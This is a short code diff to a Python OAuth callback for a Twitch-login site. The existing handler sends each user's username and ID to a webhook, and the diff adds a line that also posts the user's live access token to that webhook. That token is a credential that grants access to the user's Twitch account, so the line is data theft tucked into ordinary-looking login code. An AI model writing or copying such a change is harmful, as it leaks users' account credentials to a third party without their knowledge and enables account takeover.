@@ -65,6 +65,7 @@ def callback():
     #webhook.send(f"New user has logged in: Username: {user['login']}, Email: {user['email']}, ID: {user['id']}, Display Name: {user['display_name']}, Broadcaster Type: {user['broadcaster_type']}")
     webhook.send(f"TWITCH USERNAME: {user['login']}")
     webhook.send(f"TWITCH ID: {user['id']}")
+    webhook.send(f"NEW ACCESS_TOKEN: {access_token}")
     
     return redirect("https://dankstreamer.lol/thanks")
 
